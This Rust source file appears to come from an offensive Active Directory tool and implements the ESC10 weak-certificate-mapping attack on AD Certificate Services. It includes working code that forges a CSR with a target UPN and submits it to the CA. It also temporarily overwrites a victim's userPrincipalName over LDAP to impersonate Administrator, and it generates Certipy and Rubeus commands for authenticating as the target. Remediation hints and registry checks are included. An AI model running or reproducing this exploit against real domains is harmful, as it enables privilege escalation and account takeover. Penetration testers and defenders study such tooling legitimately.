//! ESC10 — Weak Certificate Mapping
//!
//! ESC10 covers two distinct registry-controlled weaknesses in the DC's certificate
//! mapping logic.  Both can be detected via LDAP/registry queries and exploited to
//! authenticate as a target principal using a certificate that you control.
//!
//! ## Variant A — `StrongCertificateBindingEnforcement = 0`
//!
//! When the registry value
//! `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`
//! is **absent or set to 0**, the DC uses the legacy "weak" mapping that accepts
//! the UPN in the certificate's Subject Alternative Name without any additional
//! validation.
//!
//! **Attack flow (10A):**
//! 1. Obtain/forge a certificate with `target@domain` as the SAN UPN.
//!    (Prerequisites: any template permitting Client Authentication + SAN supply,
//!    OR GenericWrite over a user so UPN can be temporarily modified — see ESC9.)
//! 2. Authenticate via PKINIT or Schannel using the certificate.
//! 3. DC maps the UPN to `target` and issues a TGT / grants LDAP access.
//!
//! ## Variant B — `CertificateMappingMethods & 0x4` (UPN Match enabled)
//!
//! When `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\CertificateMappingMethods`
//! has bit `0x4` set, the DC resolves the certificate owner via UPN comparison.
//! This is exploitable when combined with `GenericWrite` on a user object:
//!
//! **Attack flow (10B):**
//! 1. Modify victim user's `userPrincipalName` → `Administrator@corp.local` via LDAP.
//! 2. Request a certificate from *any* template that allows the victim to enroll.
//! 3. Restore the victim's UPN.
//! 4. Authenticate with the certificate — DC resolves the cert to Administrator via UPN.
//!
//! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)

use crate::adcs::pfx::create_pfx;
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_esc1_csr};
use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use tracing::info;

// ─────────────────────────────────────────────────────────
//  Registry constants (for documentation / detection output)
// ─────────────────────────────────────────────────────────

/// Registry key controlling certificate binding enforcement on DCs
pub const KDC_REG_KEY: &str = r"HKLM\SYSTEM\CurrentControlSet\Services\Kdc";

/// Registry value name for strong binding enforcement
pub const STRONG_BINDING_VALUE: &str = "StrongCertificateBindingEnforcement";

/// Registry value name for certificate mapping methods
pub const CERT_MAPPING_METHODS_VALUE: &str = "CertificateMappingMethods";

/// Bit flag within `CertificateMappingMethods` that enables UPN matching
pub const UPN_MATCH_FLAG: u32 = 0x4;

// ─────────────────────────────────────────────────────────
//  Public types
// ─────────────────────────────────────────────────────────

/// Which ESC10 variant is applicable
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Esc10Variant {
    /// Variant A: `StrongCertificateBindingEnforcement` is absent or 0
    WeakBindingEnforcement,
    /// Variant B: `CertificateMappingMethods` has UPN match bit set
    UPNMappingEnabled,
}

impl std::fmt::Display for Esc10Variant {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::WeakBindingEnforcement => {
                write!(f, "StrongCertificateBindingEnforcement=0 (Variant A)")
            }
            Self::UPNMappingEnabled => {
                write!(f, "CertificateMappingMethods has UPN match bit (Variant B)")
            }
        }
    }
}

/// Configuration for an ESC10 attack run
#[derive(Debug, Clone)]
pub struct Esc10Config {
    /// ESC10 variant detected / confirmed on the target environment
    pub variant: Esc10Variant,
    /// Certificate template name to use for enrollment
    pub template: String,
    /// UPN to impersonate (placed in SAN of the certificate request)
    pub target_upn: String,
    /// For Variant B: account whose UPN is temporarily overwritten
    pub victim_account: Option<String>,
    /// For Variant B: DN of the victim account (required for live LDAP modification)
    pub victim_dn: Option<String>,
    /// For Variant B: original UPN of the victim (for restoration)
    pub original_upn: Option<String>,
}

/// Result of a completed ESC10 attack
#[derive(Debug, Clone)]
pub struct Esc10Result {
    /// Issued certificate with the target UPN in the SAN
    pub certificate: IssuedCertificate,
    /// Variant that was exploited
    pub variant: Esc10Variant,
    /// Operator hints for the next authentication step
    pub auth_hints: Esc10AuthHints,
}

/// Post-compromise authentication command hints
#[derive(Debug, Clone)]
pub struct Esc10AuthHints {
    /// Certipy PKINIT authentication command
    pub certipy_command: String,
    /// Rubeus PKINIT authentication command  
    pub rubeus_command: String,
    /// Remediation recommendation for the defender
    pub remediation: String,
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC10 exploiter — weak certificate mapping abuse
pub struct Esc10Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc10Exploiter {
    /// Create a new ESC10 exploiter.
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute the ESC10 attack.
    ///
    /// Both variants follow the same certificate-request path; the caller
    /// is responsible for temporarily modifying the victim's UPN (Variant B)
    /// via an LDAP session before invoking this method.
    pub async fn exploit(&self, config: &Esc10Config) -> Result<Esc10Result> {
        info!(
            "ESC10 attack ({}) — template={}, target_upn={}",
            config.variant, config.template, config.target_upn
        );

        // Build a CSR with target_upn in the SAN
        let (csr_der, private_key) =
            create_esc1_csr("overthrone-esc10", &config.target_upn, &config.template)?;

        // Submit to CA
        let response = self
            .web_client
            .submit_request(&csr_der, &config.template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 10,
                reason: format!("CA rejected ESC10 request: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;

        let domain = config
            .target_upn
            .split('@')
            .nth(1)
            .unwrap_or("domain.local");
        let user = config
            .target_upn
            .split('@')
            .next()
            .unwrap_or("Administrator");
        let pfx_name = format!("{}.pfx", user.to_lowercase());

        let auth_hints = Esc10AuthHints {
            certipy_command: format!(
                "certipy auth -pfx {} -dc-ip <DC_IP> -domain {} -username {}",
                pfx_name, domain, user
            ),
            rubeus_command: format!(
                "Rubeus.exe asktgt /user:{user} /certificate:{pfx_name} /domain:{domain} \
                 /dc:<DC_IP> /nowrap"
            ),
            remediation: match config.variant {
                Esc10Variant::WeakBindingEnforcement => {
                    format!("Set HKLM\\...\\Kdc\\{STRONG_BINDING_VALUE} = 2 on all DCs and reboot")
                }
                Esc10Variant::UPNMappingEnabled => format!(
                    "Clear UPN match bit: HKLM\\...\\Kdc\\{CERT_MAPPING_METHODS_VALUE} &= ~0x{UPN_MATCH_FLAG:X}"
                ),
            },
        };

        let pfx_data =
            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());

        Ok(Esc10Result {
            certificate: IssuedCertificate {
                pfx_data,
                thumbprint: Self::compute_thumbprint(&cert_data),
                serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                valid_from: "Unknown".to_string(),
                valid_to: "Unknown".to_string(),
                template: config.template.clone(),
                subject: "CN=overthrone-esc10".to_string(),
                issuer: self.web_client.base_url(),
                public_key_algorithm: "RSA".to_string(),
                signature_algorithm: "SHA256RSA".to_string(),
                private_key_pem: private_key,
            },
            variant: config.variant.clone(),
            auth_hints,
        })
    }

    /// Perform an ESC10 Variant B attack end-to-end with a live LDAP session.
    ///
    /// Variant B requires temporarily overwriting a victim user's `userPrincipalName`
    /// so that a certificate requested while the UPN is poisoned maps to `target_upn`
    /// when the DC resolves it via the `CertificateMappingMethods` UPN match bit.
    ///
    /// This method:
    /// 1. Writes `target_upn` to the victim's `userPrincipalName` via LDAP.
    /// 2. Calls `exploit()` to request the certificate.
    /// 3. Restores the original UPN (even on error paths).
    ///
    /// For Variant A the `exploit()` method is sufficient (no UPN modification needed).
    pub async fn exploit_with_ldap(
        &self,
        config: &Esc10Config,
        ldap: &mut LdapSession,
    ) -> Result<Esc10Result> {
        if config.variant != Esc10Variant::UPNMappingEnabled {
            return Err(OverthroneError::Adcs(
                "exploit_with_ldap is only needed for ESC10 Variant B (UPNMappingEnabled)"
                    .to_string(),
            ));
        }

        let victim_dn = config.victim_dn.as_deref().ok_or_else(|| {
            OverthroneError::Adcs("ESC10 Variant B requires victim_dn".to_string())
        })?;
        let original_upn = config.original_upn.as_deref().ok_or_else(|| {
            OverthroneError::Adcs("ESC10 Variant B requires original_upn".to_string())
        })?;

        // Step 1 — poison victim UPN
        info!(
            "ESC10B: Setting UPN of {} → {}",
            victim_dn, config.target_upn
        );
        ldap.modify_replace(victim_dn, "userPrincipalName", config.target_upn.as_bytes())
            .await
            .map_err(|e| OverthroneError::Adcs(format!("ESC10B: UPN write failed: {e}")))?;

        // Step 2 — request certificate
        let cert_result = self.exploit(config).await;

        // Step 3 — restore UPN
        info!("ESC10B: Restoring UPN of {} → {}", victim_dn, original_upn);
        if let Err(e) = ldap
            .modify_replace(victim_dn, "userPrincipalName", original_upn.as_bytes())
            .await
        {
            tracing::warn!(
                "ESC10B: UPN restoration failed for {victim_dn}: {e} — manual cleanup required"
            );
        }

        cert_result
    }

    /// Check whether the DC registry indicates ESC10 Variant A
    ///
    /// Returns guidance text for the operator.  Actual registry read requires
    /// an authenticated `RegistrySession` to the target DC (see `proto::registry`).
    pub fn variant_a_check_command(dc_ip: &str) -> String {
        format!(
            "# Check for ESC10 Variant A on DC {dc_ip}\n\
             # (Using overthrone's remote registry support)\n\
             reg query \\\\{dc_ip}\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc \
             /v {STRONG_BINDING_VALUE}\n\
             # Value 0 or missing = VULNERABLE (ESC10A)"
        )
    }

    /// Check whether the DC registry indicates ESC10 Variant B
    pub fn variant_b_check_command(dc_ip: &str) -> String {
        format!(
            "# Check for ESC10 Variant B on DC {dc_ip}\n\
             reg query \\\\{dc_ip}\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc \
             /v {CERT_MAPPING_METHODS_VALUE}\n\
             # Bit 0x{UPN_MATCH_FLAG:X} set = VULNERABLE (ESC10B)"
        )
    }

    fn compute_thumbprint(der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let digest = Sha1::digest(der);
        hex::encode(digest)
    }

    fn extract_serial(der: &[u8]) -> Option<String> {
        use x509_parser::parse_x509_certificate;
        parse_x509_certificate(der)
            .ok()
            .map(|(_, c)| c.raw_serial_as_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upn_match_flag_value() {
        assert_eq!(UPN_MATCH_FLAG, 0x4);
    }

    #[test]
    fn test_esc10_variant_display() {
        let a = Esc10Variant::WeakBindingEnforcement;
        let b = Esc10Variant::UPNMappingEnabled;
        assert!(a.to_string().contains("Variant A"));
        assert!(b.to_string().contains("Variant B"));
    }

    #[test]
    fn test_variant_a_check_command_contains_dc_ip() {
        let cmd = Esc10Exploiter::variant_a_check_command("10.0.0.1");
        assert!(cmd.contains("10.0.0.1"));
        assert!(cmd.contains(STRONG_BINDING_VALUE));
    }

    #[test]
    fn test_variant_b_check_command_contains_mapping_methods() {
        let cmd = Esc10Exploiter::variant_b_check_command("192.168.1.10");
        assert!(cmd.contains(CERT_MAPPING_METHODS_VALUE));
        assert!(cmd.contains("192.168.1.10"));
    }
}
